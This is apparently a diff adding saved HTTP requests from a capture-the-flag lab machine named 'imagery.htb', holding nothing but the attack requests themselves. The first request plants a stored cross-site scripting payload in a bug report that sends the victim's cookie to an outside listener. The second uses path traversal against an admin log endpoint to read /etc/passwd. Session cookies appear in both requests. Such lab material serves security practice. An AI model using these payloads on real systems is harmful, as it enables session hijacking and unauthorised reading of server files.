@@ -1,0 +1,29 @@
+POST /report_bug HTTP/1.1
+Host: imagery.htb:8000
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: http://imagery.htb:8000/
+Content-Type: application/json
+Content-Length: 111
+Origin: http://imagery.htb:8000
+Connection: keep-alive
+Cookie: session=.eJyrVkrJLC7ISaz0TFGyUjJIMzCyMLZMUtJRyix2TMnNzFOySkvMKU4F8eMzcwtSi4rz8xJLMvPS40tSi0tKi1OLkFXAxOITk5PzS_NK4HIgwbzE3FSgHSnFiUDkUAyi9ZLzc5VqAfrjL1k.aNqU5g.6vh3xlDMUken_z5J1ncJ_R2MOlk
+Priority: u=0
+
+{"bugName":"test","bugDetails":"<img src=x onerror=this.src=\"http://10.10.14.133:9090/?c=\"+document.cookie>"}
+
+
+GET /admin/get_system_log?log_identifier=..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd HTTP/1.1
+Host: imagery.htb:8000
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+Referer: http://imagery.htb:8000/
+Cookie: session=.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aNqWxg.AB9GCjgrdiDDO8SlLuSsN7EQPk4
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+
